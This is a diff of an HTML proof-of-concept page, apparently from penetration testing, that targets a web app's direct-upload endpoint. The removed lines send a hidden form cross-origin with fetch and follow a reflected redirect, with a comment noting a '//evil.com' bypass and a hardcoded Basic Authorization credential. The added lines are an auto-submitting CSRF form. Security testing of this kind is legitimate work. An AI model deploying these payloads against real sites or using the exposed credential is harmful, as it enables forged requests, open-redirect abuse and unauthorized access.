@@ -1,22 +1,16 @@
-<!DOCTYPE html>
-<html>
-<form id="f" style="display:none">
-  <input name="blob[filename]" value="x.txt">
-  <input name="blob[content_type]" value="text/plain">
-  <input name="blob[byte_size]" value="4">
-  <input name="blob[checksum]" value="U29tZQ==">
-</form>
-<script>
-const fd = new FormData(document.getElementById('f'));
-// or URLSearchParams for x-www-form-urlencoded
-fetch("https://pentest.cdd.io/vaults/1050593102/active_storage_direct_uploads",{
-  method:"POST",
-  body: fd, // browser sets Content-Type multipart/form-data + Origin: https://daplq...oast.pro/file.html + Referer
-  headers:{ "X-Requested-With":"XMLHttpRequest","Accept":"application/json" }
-  // no credentials as requested, no Authorization - will be 401 unless Basic Auth cached; add "Authorization":"Basic Y2RkOmNvbm5lY3Rfc2hhcmluZ19lbnRpdGxlZF9kYW5l" if needed
-}).then(r=>r.json()).then(j=>{
-  console.log(j); // -> {"redirect_url":"https://daplq.../file.html"} reflects Referer
-  if(j.redirect_url) location.href=j.redirect_url; // //evil.com bypass cdd_direct_upload.ts:422
-});
-</script>
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>CSRF PoC - Form</title>
+</head>
+<body>
+  <form id="csrf" action="https://pentest.cdd.io:443/vaults/1050591758/active_storage_direct_uploads" method="POST">
+    <!-- No form-compatible parameters were detected. -->
+    <input type="submit" value="Submit request">
+  </form>
+  <script>
+    document.getElementById("csrf").submit();
+  </script>
+</body>
 </html>
